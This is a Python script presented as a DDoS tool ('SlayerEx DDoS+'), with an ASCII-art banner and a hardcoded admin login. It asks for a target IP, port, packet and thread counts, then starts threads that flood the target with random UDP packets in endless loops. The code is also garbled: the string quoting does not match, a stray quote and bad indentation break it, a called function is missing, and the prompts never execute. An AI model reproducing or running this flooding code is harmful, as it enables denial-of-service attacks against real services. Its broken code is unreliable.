#Autor By Luc1fer
import random
import socket
import threading
import time
import os,sys
import random, socket, threading
import os
import getpass

os.system("clear")
print('''
⡀                                             ⡄
⢻⣦⡀              ⣀⣀⠤⠤⠴⢶⣶⡶⠶⠤⠤⢤⣀⡀            ⢀⣠⣾⠁
 ⠻⣯⡗⢶⣶⣶⣶⣶⢶⣤⣄⣀⣀⡤⠒⠋⠁    ⠚⢯⠟⠂    ⠉⠙⠲⣤⣠⡴⠖⣲⣶⡶⣶⣿⡟⢩⡴⠃ 
  ⠈⠻⠾⣿⣿⣬⣿⣾⡏⢹⣏⠉⠢⣄⣀⣀⠤⠔⠒⠊⠉⠉⠉⠉⠑⠒ ⠤⣀⡠⠚⠉⣹⣧⣝⣿⣿⣷⠿⠿⠛⠉   
       ⠈⣹⠟⠛⠿⣿⣤⡀⣸⠿⣄           ⣠⠾⣇⢰⣶⣿⠟⠋⠉⠳⡄       
      ⢠⡞⠁  ⡠⢾⣿⣿⣯ ⠈⢧⡀       ⢀⡴⠁⢀⣿⣿⣯⢼⠓⢄ ⢀⡘⣦⡀     
     ⣰⣟⣟⣿⣀⠎  ⢳⠘⣿⣷⡀⢸⣿⣶⣤⣄⣀⣤⢤⣶⣿⡇⢀⣾⣿⠋⢀⡎  ⠱⣤⢿⠿⢷⡀    
    ⣰⠋ ⠘⣡⠃   ⠈⢇⢹⣿⣿⡾⣿⣻⣖⠛⠉⠁⣠⠏⣿⡿⣿⣿⡏ ⡼    ⠘⢆  ⢹⡄   
   ⢰⠇  ⣰⠃  ⣀⣀⣀⣼⢿⣿⡏⡰⠋⠉⢻⠳⣤⠞⡟ ⠈⢣⡘⣿⡿⠶⡧⠤⠄⣀⣀ ⠈⢆  ⢳   
   ⡟  ⢠⣧⣴⣊⣩⢔⣠⠞⢁⣾⡿⢹⣷⠋ ⣸⡞⠉⢹⣧⡀⠐⢃⢡⢹⣿⣆⠈⠢⣔⣦⣬⣽⣶⣼⣄ ⠈⣇  
  ⢸⠃ ⠘⡿⢿⣿⣿⣿⣛⣳⣶⣿⡟⣵⠸⣿⢠⡾⠥⢿⡤⣼⠶⠿⡶⢺⡟⣸⢹⣿⣿⣾⣯⢭⣽⣿⠿⠛⠏  ⢹  
  ⢸   ⡇ ⠈⠙⠻⠿⣿⣿⣿⣇⣸⣧⣿⣦⡀ ⣘⣷⠇ ⠄⣠⣾⣿⣯⣜⣿⣿⡿⠿⠛⠉   ⢸  ⢸⡆ 
  ⢸   ⡇    ⣀⠼⠋⢹⣿⣿⣿⡿⣿⣿⣧⡴⠛ ⢴⣿⢿⡟⣿⣿⣿⣿ ⠙⠲⢤⡀   ⢸⡀ ⢸⡇ 
  ⢸⣀⣷⣾⣇ ⣠⠴⠋⠁  ⣿⣿⡛⣿⡇⢻⡿⢟⠁  ⢸⠿⣼⡃⣿⣿⣿⡿⣇⣀⣀⣀⣉⣓⣦⣀⣸⣿⣿⣼⠁ 
  ⠸⡏⠙⠁⢹⠋⠉⠉⠉⠉⠉⠙⢿⣿⣅ ⢿⡿⠦ ⠁ ⢰⡃⠰⠺⣿⠏⢀⣽⣿⡟⠉⠉⠉ ⠈⠁⢈⡇⠈⠇⣼  
   ⢳   ⢧      ⠈⢿⣿⣷⣌⠧⡀⢲⠄  ⢴⠃⢠⢋⣴⣿⣿⠏       ⡸  ⢠⠇  
   ⠈⢧  ⠈⢦      ⠈⠻⣿⣿⣧⠐⠸⡄⢠ ⢸ ⢠⣿⣟⡿⠋       ⡰⠁ ⢀⡟   
    ⠈⢧   ⠣⡀      ⠈⠛⢿⡇⢰⠁⠸⠄⢸ ⣾⠟⠉       ⢀⠜⠁ ⢀⡞    
     ⠈⢧⡀  ⠙⢄       ⢨⡷⣜   ⠘⣆⢻        ⡴⠋  ⣠⠎     
       ⠑⢄   ⠑⠦⣀    ⠈⣷⣿⣦⣤⣤⣾⣿⢾     ⣀⠴⠋  ⢀⡴⠃      
        ⠈⠑⢄⡀⢸⣶⣿⡑⠂⠤⣀⡀⠱⣉⠻⣏⣹⠛⣡⠏⢀⣀⠤⠔⢺⡧⣆ ⢀⡴⠋        
           ⠉⠳⢽⡁    ⠈⠉⠙⣿⠿⢿⢿⠍⠉    ⠉⣻⡯⠛⠁          
              ⠈⠑⠲⠤⣀⣀⡀ ⠈⣽⡟⣼ ⣀⣀⣠⠤⠒⠋⠁             
                    ⠉⠉⠉⢻⡏⠉⠉⠁                   
                       ⠈
""")
username = str(input("\033[33m[Luc1fer] \033[93mUsername:"))
password = str(input("\033[33m[Luc1fer] \033[93mPassword:"))
if password == "#Lucifer" and username == "SlayerEx":
    print ("Logged in as admin")
    time.sleep(2)

else:
    print ("Incorrect Password. Please try again.")
    time.sleep(999)

os.system("clear")
print("\033[92mConnecting To Server [\033[97m•\033[92m]")
time.sleep(0.9)

os.system("clear")
print("Connecting To Server [\033[97m••\033[92m]")
time.sleep(0.9)

os.system("clear")
print("Connecting To Server [\033[97m•••\033[92m]")
time.sleep(0.9)

os.system("clear")
print("Connecting To Server [\033[97m••\033[92m]")
time.sleep(0.9)

os.system("clear")
print("Connecting To Server [\033[97m•\033[92m]")
time.sleep(0.9)

print("█▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█")


helpservice = '''
print(" SlayerEx DDoS+")
print(" Tolls Have Problem? Message Me")
print(" #Tolls By Luc1fer#")
ip = str(input(" Send IP:"))
port = int(input(" Port:"))
choice = str(input(" Attack?(y/n):"))
times = int(input(" Packets?:"))
threads = int(input(" Threads?:"))
'''
def run():
	data = random._urandom(1821)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" Attack!!!")
		except:
			print(" Error!!")'
			
			def run3():
	data = random._urandom(818)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" SlayeeEx ")
		except:
			print("[!] ERROR SERVER TIME OUT")
for y in range(threads):
	if choice == 'UDP':
		th = threading.Thread(target = run)
		th.start()
		th = threading.Thread(target = run2)
		th.start()
		th = threading.Thread(target = run3)
		th.start()
	if choice == 'udp':
		th = threading.Thread(target = run)
		th.start()
		th = threading.Thread(target = run2)
		th.start()
		th = threading.Thread(target = run3)
		th.start()
		